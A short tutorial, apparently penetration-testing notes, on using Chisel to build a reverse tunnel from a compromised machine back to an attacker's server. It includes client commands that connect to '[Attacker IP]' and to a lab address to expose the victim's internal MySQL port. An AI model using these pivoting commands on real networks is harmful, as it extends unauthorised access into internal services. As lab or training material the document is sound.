# Introduction
Chisel is an open-source application for port tunneling. You can get it from https://github.com/jpillora/chisel. Clone the repo and follow the installation instructions.

In order to port tunnel with chisel, you need to have a copy of the binary on both the attacking and the compromised machines.

# Creating a reverse tunnel
Run the following command on the attacking machine:
```bash
chisel server -p [Listen Port] --reverse &
```

This will setup a chisel server on `Listen Port`.

On the compromised systenm run:
```bash
chisel client [Attacker IP]:[Listen Port] R:[Local Host]:[Local Port]:[Remote Host]:[Remote Port] &
```

This will endeavour to connect to a chisel server at the specified `Attacker IP` and `Listen Port`. Once it has connected to the remote chisel server, the chisel server will open `Remote Port` on the `Remote Host` and tunnel it to the `Local Port` of `Local Host`. From now on, any traffic sent to `Remote Port` on the `Remote Host` will be forwarded to the `Local Port` of `Local Host`. 

Chisel also defines some defaults for these values, which means you can omit some of them:

`Local Host` - 0.0.0.0
`Remote Host` - 0.0.0.0 (server localhost)

As an example, suppose you start a chisel server on your attacking machine (10.10.10.189) on port 1337, and want to gain access to port 3306 on the compromised machine. On the attacking machine you run:

```bash
chisel server -p 1337 --reverse &
```

On the compromised system you will run:
```bash
chisel client 10.10.10.189:1337 R:localhost:3306:localhost:31337 &
```

The above basically translates to "Forward any traffic intended for port 31337 localhost on my attacking machine to port 3306 on the localhost of the compromised system".
